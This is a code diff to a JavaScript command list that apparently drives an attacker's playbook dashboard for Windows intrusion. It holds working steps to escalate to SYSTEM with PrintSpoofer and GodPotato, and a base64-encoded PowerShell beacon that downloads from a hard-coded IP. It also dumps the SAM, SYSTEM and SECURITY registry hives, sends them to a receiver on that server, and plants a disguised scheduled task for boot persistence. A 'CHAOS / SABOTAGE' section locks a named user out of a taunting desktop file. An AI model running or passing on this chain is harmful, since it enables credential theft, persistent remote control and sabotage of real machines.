@@ -2759,118 +2759,167 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[CHAIN-1] Check SeImpersonate Privilege",
-    desc: "FIRST STEP. If SeImpersonate shows Enabled, you can escalate to SYSTEM using Potato exploits. Common on IIS/SQL service accounts.",
+    desc: "FIRST STEP. If SeImpersonate shows Enabled, you can escalate to SYSTEM. If not shown, try different exploit.",
     code: "whoami /priv | findstr SeImpersonate",
     tags: ["cmd", "privesc", "recon", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-2] Download PrintSpoofer",
-    desc: "Download PrintSpoofer to target. Must have HTTP server running on VPS:8889 with PrintSpoofer.exe in served directory.",
-    code: "IWR -Uri 'http://168.144.166.97:8889/PrintSpoofer.exe' -OutFile C:\\\\Windows\\\\Temp\\\\ps.exe -UseBasicParsing",
+    desc: "Downloads PrintSpoofer.exe to C:\\Windows\\Temp\\ps.exe. VPS HTTP server must be running on 8889.",
+    code: "IWR -Uri http://168.144.166.97:8889/PrintSpoofer.exe -OutFile C:\\Windows\\Temp\\ps.exe -UseBasicParsing",
     tags: ["ps", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
+    title: "[CHAIN-2-VERIFY] Check PrintSpoofer Downloaded",
+    desc: "Verify file exists and has size. If 0 bytes or missing, check VPS HTTP server.",
+    code: "dir C:\\Windows\\Temp\\ps.exe",
+    tags: ["cmd", "privesc", "recon"],
+    accent: "#00f0ff"
+  },
+  {
     title: "[CHAIN-3] Download GodPotato",
-    desc: "Alternative to PrintSpoofer. GodPotato works on more Windows versions. Use -cmd flag instead of -c.",
-    code: "IWR -Uri 'http://168.144.166.97:8889/GodPotato.exe' -OutFile C:\\\\Windows\\\\Temp\\\\gp.exe -UseBasicParsing",
+    desc: "Alternative to PrintSpoofer. Works on newer Windows. Use -cmd flag instead of -c.",
+    code: "IWR -Uri http://168.144.166.97:8889/GodPotato.exe -OutFile C:\\Windows\\Temp\\gp.exe -UseBasicParsing",
     tags: ["ps", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-4] Encode Beacon for -enc",
-    desc: "Converts beacon download cradle to Base64 for -enc flag. Avoids quote issues. Copy output and paste into CHAIN-5.",
-    code: "$cmd = 'IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))",
+    desc: "Converts beacon to Base64. Copy the output string for CHAIN-5. Already pre-encoded below.",
+    code: "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)'))",
     tags: ["ps", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-5] PrintSpoofer to SYSTEM",
-    desc: "Execute encoded beacon as SYSTEM. Base64 string is pre-encoded beacon cradle. New session appears in C2 as NT AUTHORITY\\SYSTEM.",
-    code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"powershell -ep bypass -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAGIAZQBhAGMAbwBuAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"",
+    desc: "Executes beacon as SYSTEM. Watch C2 for new session showing NT AUTHORITY\\SYSTEM.",
+    code: "C:\\Windows\\Temp\\ps.exe -c \"powershell -ep bypass -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAGIAZQBhAGMAbwBuAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"",
     tags: ["cmd", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-5-ALT] GodPotato to SYSTEM",
-    desc: "Same as PrintSpoofer but uses GodPotato. Note: uses -cmd flag not -c. Works on newer Windows versions.",
-    code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"powershell -ep bypass -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAGIAZQBhAGMAbwBuAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"",
+    desc: "Alternative using GodPotato. Uses -cmd flag. Watch C2 for SYSTEM session.",
+    code: "C:\\Windows\\Temp\\gp.exe -cmd \"powershell -ep bypass -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAGIAZQBhAGMAbwBuAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"",
     tags: ["cmd", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
+    title: "[CHAIN-5-VERIFY] Confirm SYSTEM Shell",
+    desc: "Run in new C2 session. Should show 'nt authority\\system'. If not, re-run CHAIN-5.",
+    code: "whoami",
+    tags: ["cmd", "privesc", "recon"],
+    accent: "#00f0ff"
+  },
+  {
     title: "[CHAIN-6] Dump SAM/SYSTEM/SECURITY",
-    desc: "Run as SYSTEM. Saves registry hives containing password hashes. Need both SAM and SYSTEM to crack. SECURITY has LSA secrets.",
-    code: "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam\\nreg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\sys\\nreg save HKLM\\\\SECURITY C:\\\\Windows\\\\Temp\\\\sec",
+    desc: "Saves registry hives. Run each line. Need SYSTEM privs. Files save to C:\\Windows\\Temp\\.",
+    code: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam\\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys\\nreg save HKLM\\SECURITY C:\\Windows\\Temp\\sec",
     tags: ["cmd", "postexploit", "playbook"],
     accent: "#ff9800"
   },
   {
+    title: "[CHAIN-6-VERIFY] Check Hive Files",
+    desc: "Verify all 3 files exist with size > 0. If missing, re-run dump commands.",
+    code: "dir C:\\Windows\\Temp\\sam C:\\Windows\\Temp\\sys C:\\Windows\\Temp\\sec",
+    tags: ["cmd", "postexploit", "recon"],
+    accent: "#00f0ff"
+  },
+  {
     title: "[CHAIN-7] Exfil SAM to VPS",
-    desc: "POST SAM hive to VPS receiver (catch_all.py on port 8083). File saves to /keys/ directory on VPS.",
-    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sam'); IRM -Uri 'http://168.144.166.97:8083/sam' -Method POST -Body $s",
+    desc: "POSTs SAM hive to VPS. Should return 'OK'. Check /keys/ on VPS after.",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'); IRM -Uri http://168.144.166.97:8083/sam -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2", "playbook"],
     accent: "#ff6b35"
   },
   {
     title: "[CHAIN-8] Exfil SYSTEM to VPS",
-    desc: "POST SYSTEM hive. REQUIRED for cracking - contains BOOTKEY to decrypt SAM. Without this, SAM alone is useless.",
-    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sys'); IRM -Uri 'http://168.144.166.97:8083/system' -Method POST -Body $s",
+    desc: "POSTs SYSTEM hive. REQUIRED for decryption. Should return 'OK'.",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sys'); IRM -Uri http://168.144.166.97:8083/system -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2", "playbook"],
     accent: "#ff6b35"
   },
   {
-    title: "[CHAIN-9] SYSTEM Persistence (Survives Reboot)",
-    desc: "Creates scheduled task running as SYSTEM on boot. Beacon auto-connects when machine restarts. Check with 'schtasks /query /tn Updater'.",
-    code: "schtasks /create /tn \"Updater\" /tr \"powershell -w hidden -ep bypass IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)\" /sc onstart /ru SYSTEM /f",
+    title: "[CHAIN-8-VERIFY] Check VPS Received Files",
+    desc: "Run on VPS. Should show sam and system files with size > 0.",
+    code: "ls -la /keys/",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[CHAIN-9] SYSTEM Persistence",
+    desc: "Creates scheduled task 'Updater' running as SYSTEM on boot. Beacon auto-reconnects on reboot.",
+    code: "schtasks /create /tn Updater /tr \"powershell -w hidden -ep bypass IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)\" /sc onstart /ru SYSTEM /f",
     tags: ["cmd", "persist", "playbook"],
     accent: "#e74c3c"
+  },
+  {
+    title: "[CHAIN-9-VERIFY] Check Persistence",
+    desc: "Verify scheduled task exists and shows correct command. Should show 'Updater' with powershell command.",
+    code: "schtasks /query /tn Updater /v /fo LIST | findstr /i \"Task To Run\"",
+    tags: ["cmd", "persist", "recon"],
+    accent: "#00f0ff"
   },
   // ═══════════════════════════════════════════════════════════════
   // VPS SETUP - 168.144.166.97
   // ═══════════════════════════════════════════════════════════════
   {
     title: "VPS: Start C2 Listener (4444)",
-    desc: "Start multi-session C2 handler. Beacons connect here. Use 'sessions' to list, 'use N' to interact, 'bg' to background.",
+    desc: "Start in tmux/screen. Beacons connect here. Commands: sessions, use N, bg, kill N.",
     code: "cd /root && python3 c2_multi_v2.py",
     tags: ["linux", "vps", "c2", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Start HTTP Server (8889)",
-    desc: "Serves files to targets (beacon.ps1, PrintSpoofer, GodPotato). Must be in /opt directory. Targets download from here.",
+    desc: "Serves beacon.ps1, PrintSpoofer, GodPotato. Run in /opt where files are.",
     code: "cd /opt && python3 -m http.server 8889",
     tags: ["linux", "vps", "c2", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Start Exfil Receiver (8083)",
-    desc: "Catches POST requests from targets. Saves to /keys/ directory. Used for SAM/SYSTEM/SSH key exfiltration.",
+    desc: "Catches POST data from targets. Saves to /keys/. Run in separate terminal.",
     code: "cd /opt && python3 catch_all.py",
     tags: ["linux", "vps", "c2", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Copy Beacon to HTTP Dir",
-    desc: "Beacon file must be in HTTP server directory (/opt). If missing, target gets 404 and beacon fails.",
+    desc: "Beacon must be in /opt for HTTP server to serve it. Run once during setup.",
     code: "cp /beacon_persistent.ps1 /opt/beacon.ps1",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Download Potato Tools",
-    desc: "Download PrintSpoofer and GodPotato from GitHub releases. Places them in /opt for HTTP server to serve.",
-    code: "cd /opt\\nwget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe\\nwget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe",
+    desc: "Downloads PrintSpoofer and GodPotato to /opt. Run once during VPS setup.",
+    code: "cd /opt && wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe && wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe",
     tags: ["linux", "vps", "privesc"],
     accent: "#00ff41"
   },
   {
-    title: "VPS: Check All Listeners",
-    desc: "Verify all services running. Should see: 4444 (C2), 8083 (exfil), 8889 (HTTP). If missing, start the service.",
-    code: "ss -tlnp | grep -E '4444|8080|8083|8889'",
+    title: "VPS-VERIFY: Check All Listeners",
+    desc: "Should show 4444, 8083, 8889 all LISTEN. If missing, start that service.",
+    code: "ss -tlnp | grep -E '4444|8083|8889'",
     tags: ["linux", "vps", "recon"],
-    accent: "#00ff41"
+    accent: "#00f0ff"
+  },
+  {
+    title: "VPS-VERIFY: Check HTTP Files",
+    desc: "Should show beacon.ps1, PrintSpoofer.exe, GodPotato.exe. If missing, copy them.",
+    code: "ls -la /opt/*.ps1 /opt/*.exe",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "VPS-VERIFY: Test HTTP Server",
+    desc: "Should return beacon content. If 404, file missing from /opt.",
+    code: "curl http://localhost:8889/beacon.ps1 | head -5",
+    tags: ["linux", "vps", "recon"],
+    accent: "#00f0ff"
   },
   // ═══════════════════════════════════════════════════════════════
   // CLOUDLABS HASHES - DUMPED 2026-08-02
@@ -3017,11 +3066,46 @@ const COMMANDS = [
   // CHAOS / SABOTAGE - Run as NT AUTHORITY\SYSTEM
   // ═══════════════════════════════════════════════════════════════
   {
-    title: "[CHAOS] Undeletable File on Desktop",
-    desc: "Run as SYSTEM. Creates file owned by SYSTEM with explicit DENY on delete. Run each line separately in C2 shell.",
-    code: "echo PWNED > C:\\Users\\adminvm1\\Desktop\\PWNED.txt\\ntakeown /f C:\\Users\\adminvm1\\Desktop\\PWNED.txt\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /setowner SYSTEM\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /inheritance:r\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /grant SYSTEM:F\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /deny adminvm1:D",
+    title: "[CHAOS-1] Create Undeletable File",
+    desc: "Step 1: Create the file on adminvm1 desktop. Run as SYSTEM.",
+    code: "echo PWNED BY PSYCHO > C:\\Users\\adminvm1\\Desktop\\PWNED.txt",
     tags: ["cmd", "chaos", "postexploit"],
     accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS-2] Set SYSTEM as Owner",
+    desc: "Step 2: Make SYSTEM the owner so adminvm1 cant change permissions.",
+    code: "icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /setowner SYSTEM",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS-3] Remove Inherited Permissions",
+    desc: "Step 3: Remove all inherited ACLs. File now has NO permissions.",
+    code: "icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /inheritance:r",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS-4] Remove User Access",
+    desc: "Step 4: Explicitly remove adminvm1, Administrators, Users from ACL.",
+    code: "icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove adminvm1\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove Administrators\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove Users",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS-5] Grant SYSTEM Only",
+    desc: "Step 5: Only SYSTEM can access. adminvm1 cant read, write, or delete.",
+    code: "icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /grant SYSTEM:F",
+    tags: ["cmd", "chaos"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[CHAOS-VERIFY] Check File Permissions",
+    desc: "Verify: Should show ONLY 'NT AUTHORITY\\SYSTEM:(F)'. If adminvm1 appears, redo steps.",
+    code: "icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt",
+    tags: ["cmd", "chaos", "recon"],
+    accent: "#00f0ff"
   },
   {
     title: "[CHAOS] Send Popup Message to User",
